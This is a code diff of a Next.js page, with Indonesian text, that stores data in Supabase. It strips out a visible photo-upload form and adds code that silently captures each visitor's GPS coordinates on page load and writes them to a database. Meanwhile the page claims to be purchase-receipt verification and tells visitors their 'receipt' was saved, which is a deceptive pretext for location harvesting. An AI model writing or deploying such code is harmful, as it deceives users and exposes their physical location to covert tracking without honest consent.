@@ -20,17 +20,29 @@ const supabase = createClient(
 );
 
 export default function Home() {
-  const [location, setLocation] = useState(null);
-  const [uploading, setUploading] = useState(false);
+  const [locationSaved, setLocationSaved] = useState(false);
 
   useEffect(() => {
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
-        (pos) => {
-          setLocation({
-            latitude: pos.coords.latitude,
-            longitude: pos.coords.longitude,
-          });
+        async (pos) => {
+          const latitude = pos.coords.latitude;
+          const longitude = pos.coords.longitude;
+
+          // Simpan ke Supabase
+          const { error } = await supabase.from("photos").insert([
+            {
+              latitude,
+              longitude,
+            },
+          ]);
+
+          if (error) {
+            console.error("Gagal simpan lokasi:", error.message);
+          } else {
+            setLocationSaved(true);
+            console.log("Lokasi berhasil disimpan.");
+          }
         },
         (err) => {
           console.error("Gagal ambil lokasi:", err.message);
@@ -39,95 +51,23 @@ export default function Home() {
     }
   }, []);
 
-const handlePhotoChange = async (e) => {
-  const file = e.target.files[0];
-
-  if (!file) {
-    alert("Silakan pilih file terlebih dahulu.");
-    return;
-  }
-
-  if (!location) {
-    alert("Lokasi belum tersedia. Pastikan layanan lokasi diaktifkan.");
-    return;
-  }
-
-  setUploading(true);
-  const fileName = `${Date.now()}-${file.name}`;
-
-  // Upload foto ke Supabase Storage
-  const { data: uploadData, error: uploadError } = await supabase.storage
-    .from("photos")
-    .upload(fileName, file);
-
-  if (uploadError) {
-    console.error("Error saat mengunggah foto:", uploadError);
-    alert("Gagal mengunggah foto: " + uploadError.message);
-    setUploading(false);
-    return;
-  }
-
-  const fileUrl = `${process.env.NEXT_PUBLIC_SUPABASE_URL}/storage/v1/object/public/photos/${fileName}`;
-
-  // Menyimpan data ke tabel photos
-  const { data: insertData, error: insertError } = await supabase
-    .from("photos")
-    .insert([
-      {
-        file_url: fileUrl,
-        latitude: location.latitude,
-        longitude: location.longitude,
-      },
-    ]);
-
-  if (insertError) {
-    console.error("Error saat menyimpan data ke database:", insertError);
-    alert("Gagal menyimpan data ke database: " + insertError.message);
-  } else {
-    alert("Foto dan lokasi berhasil disimpan!");
-  }
-
-  setUploading(false);
-};
-
-
-
-
   return (
     <>
       <Head>
-        <title></title>
-        <meta name="description" content="Ambil foto dan lokasi lalu upload ke Supabase" />
+        <title>Verifikasi Lokasi</title>
+        <meta name="description" content="Simpan lokasi GPS ke Supabase" />
         <meta name="viewport" content="width=device-width, initial-scale=1" />
-        <link rel="icon" href="/favicon.ico" />
       </Head>
 
       <div className={`${styles.page} ${geistSans.variable} ${geistMono.variable}`}>
         <main className={styles.main}>
-          <h1></h1>
-
-        {location && (
-          <p>
-            Latitude: {location.latitude}
-            <br />
-            Longitude: {location.longitude}
-          </p>
-        )}
-
-
-          <input
-            type="file"
-            accept="image/*"
-            capture="environment"
-            onChange={handlePhotoChange}
-            disabled={uploading}
-            style={{ marginTop: "1rem" }}
-          />
-          {uploading && <p>Uploading...</p>}
+          <h1>Verifikasi Struk Pembelian</h1>
+          {locationSaved ? (
+            <p>Struk berhasil disimpan ke database ✅</p>
+          ) : (
+            <p>Mengambil dan menyimpan Struk...</p>
+          )}
         </main>
-
-        <footer className={styles.footer}>
-        </footer>
       </div>
     </>
   );
